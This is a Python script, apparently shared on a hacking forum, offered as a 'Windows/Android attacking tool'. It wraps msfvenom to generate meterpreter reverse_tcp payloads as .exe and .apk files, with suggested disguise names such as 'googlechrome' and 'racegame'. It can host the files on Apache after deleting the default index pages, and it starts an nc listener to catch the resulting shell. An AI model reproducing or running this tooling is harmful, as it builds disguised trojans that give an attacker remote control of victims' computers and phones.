# Author $bash
#                  memoryhackers.org
#        if you have any questions, you can ask me.
#   aklınıza takılan ne olursa olsun bana sorabilirsiniz.
# |||||||||||||||||||||||||||||||||||||||||||||||||||||||
#       s   o   c   i   a   l      m    e   d   i   a
#========================================================
#               instagram.: @yigitaydn.py
#                  twitter.: @outputscripts
#                      facebook.: Yiğithan Aydın
#                          github.: xwbash
#                               YOUTUBE : $BASH
def apt_get():
    callmebitch.system("clear")
    print("[*] be ready for devil.")
    inception.sleep(2)
    callmebitch.system("clear")
    callmebitch.system("apt-get update")
    callmebitch.system("apt-get install figlet")
    callmebitch.system("apt-get update msfconsole")
    callmebitch.system("clear")
def intro():
    callmebitch.system("clear")
    print("""
    ░░░░░░░▄▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▄░░░░░░
    ░░░░░░█░░▄▀▀▀▀▀▀▀▀▀▀▀▀▀▄░░█░░░░░
    ░░░░░░█░█░▀░░░░░▀░░▀░░░░█░█░░░░░
    ░░░░░░█░█░░░░░░░░▄▀▀▄░▀░█░█▄▀▀▄░
    █▀▀█▄░█░█░░▀░░░░░█░░░▀▄▄█▄▀░░░█░
    ▀▄▄░▀██░█▄░▀░░░▄▄▀░░░░░░░░░░░░▀▄
    ░░▀█▄▄█░█░░░░▄░░█░░░▄█░░░▄░▄█░░█
    ░░░░░▀█░▀▄▀░░░░░█░██░▄░░▄░░▄░███
    ░░░░░▄█▄░░▀▀▀▀▀▀▀▀▄░░▀▀▀▀▀▀▀░▄▀░
    ░░░░█░░▄█▀█▀▀█▀▀▀▀▀▀█▀▀█▀█▀▀█░░░
    ░░░░▀▀▀▀░░▀▀▀░░░░░░░░▀▀▀░░▀▀░░░░
    :: welcome to the executioner ::
    """)
    inception.sleep(3.5)
def loading():
    print("""
       _..._     
     .:::::::.    
    ::::::::::: 
    ::::::::::: NEW MOON
    `:::::::::'  
      `':::''   """)
    inception.sleep(1.5)
    callmebitch.system("clear")
    print("""
       _..._     
     .::::. `.    
    :::::::.  :    
    ::::::::  :  WAXING CRESCENT
    `::::::' .'  
      `'::'-'     """)

    inception.sleep(1.5)
    callmebitch.system("clear")
    print("""
       _..._     
     .::::  `.    
    ::::::    :   
    ::::::    :  FIRST QUARTER
    `:::::   .'  
      `'::.-'
                """)
    inception.sleep(1.5)
    callmebitch.system("clear")
    print("""
       _..._     
     .::'   `.    
    :::       :    
    :::       :  WAXING GIBBOUS  
    `::.     .'  
      `':..-'
    """)
    inception.sleep(1.5)
    callmebitch.system("clear")
    print("""
       _..._     
     .'     `.    
    :         :
    :         :  FULL MOON
    `.       .'  
      `-...-'
      """)
    inception.sleep(1.5)
    callmebitch.system("clear")
def mainlogo():
    callmebitch.system("clear")
    print("""
     ▄▄███▄▄·██████╗  █████╗ ███████╗██╗  ██╗
     ██╔════╝██╔══██╗██╔══██╗██╔════╝██║  ██║
     ███████╗██████╔╝███████║███████╗███████║
     ╚════██║██╔══██╗██╔══██║╚════██║██╔══██║
     ███████║██████╔╝██║  ██║███████║██║  ██║
     ╚═▀▀▀══╝╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
     ========================================
            <instagram.:@yigitaydn.py>
            ==========================
                 memoryhackers.org
                ==================    
     1.) Windows attacking tool
     2.) Android attacking tool 
     3.) Attack listening tool
    """)
def finish():
    callmebitch.system("clear")
    callmebitch.system("figlet SUCCESS")
    print("""
    [F] Name of %s exploit successfully created.
    [F] Have fun :)
    
                    .$bash.
    """ %(d))

import time as inception
import os as callmebitch


# mainlogo // payloadapk // payloadexe // payloadlistener // intro // apt_get // loading
apt_get()
intro()
mainlogo()
a = input("[*] Please enter your choise.: ")

if a == "1":
        callmebitch.system("clear")
        loading()
        callmebitch.system("figlet WINDOWS")
        b = input("[*] Please enter your ip adress.: ")
        callmebitch.system("clear")
        callmebitch.system("figlet WINDOWS")
        print("[INFO] If you not know port. You can write '4444'.")
        c = input("[*] Please enter port.: ")
        callmebitch.system("clear")
        callmebitch.system("figlet WINDOWS")
        print("[INFO] Example about name. googlechrome.")
        d = input("[*] Please enter name of exploit.: ")
        callmebitch.system("clear")
        print("""
        [*] Exploit is creating..
        """)
        inception.sleep(2)
        x = input("[*] Want to add exploit to web site ? Y/N .:")
        if x == "Y":
            callmebitch.system("service apache2 start")
            callmebitch.system("sudo rm /var/www/html/index.html")
            callmebitch.system("sudo rm /var/www/html/index.lighttpd.html")
            callmebitch.system("sudo rm /var/www/html/index.nginx-debian.html")
            callmebitch.system("clear")
            k = ("msfvenom -p windows/meterpreter/reverse_tcp LHOST=%s LPORT=%s R > /var/www/html/%s.exe " % (b, c, d))
        else:
            k = ("msfvenom -p windows/meterpreter/reverse_tcp LHOST=%s LPORT=%s R > %s.exe " % (b, c, d))
        callmebitch.system(k)
        callmebitch.system("clear")
        finish()

        callmebitch.system(k)
        callmebitch.system("clear")
        finish()
elif a == "2":
        callmebitch.system("clear")
        loading()
        callmebitch.system("figlet ANDROID")
        b = input("[*] Please enter your ip adress.: ")
        callmebitch.system("clear")
        callmebitch.system("figlet ANDROID")
        print("[INFO] If you not know port. You can write '4444'.")
        c = input("[*] Please enter port.: ")
        callmebitch.system("clear")
        callmebitch.system("figlet ANDROID")
        print("[INFO] Example about name. racegame.")
        d = input("[*] Please enter name of exploit.: ")
        callmebitch.system("clear")
        print("""
               [*] Exploit is creating..
               """)
        inception.sleep(2)
        x = input("[*] Want to add exploit to web site ? Y/N .:")
        if x == "Y":
            callmebitch.system("service apache2 start")
            callmebitch.system("sudo rm /var/www/html/index.html")
            callmebitch.system("sudo rm /var/www/html/index.lighttpd.html")
            callmebitch.system("sudo rm /var/www/html/index.nginx-debian.html")
            callmebitch.system("clear")
            k = ("msfvenom -p android/meterpreter/reverse_tcp LHOST=%s LPORT=%s R > /var/www/html/%s.apk " % (b, c, d))
        else:
            k = ("msfvenom -p android/meterpreter/reverse_tcp LHOST=%s LPORT=%s R > %s.apk " % (b, c, d))
        callmebitch.system(k)
        callmebitch.system("clear")
        finish()
elif a == "3":
        callmebitch.system("clear")
        callmebitch.system("figlet LISTEN")
        xs = input("[*] Enter the port.: ")
        port = ("nc -lvnp %s" %xs)
        callmebitch.system(port)

else:
        print("""
        [!] You typed %s, %s is cannot found
        [!] Please try again.
        """%a,a)



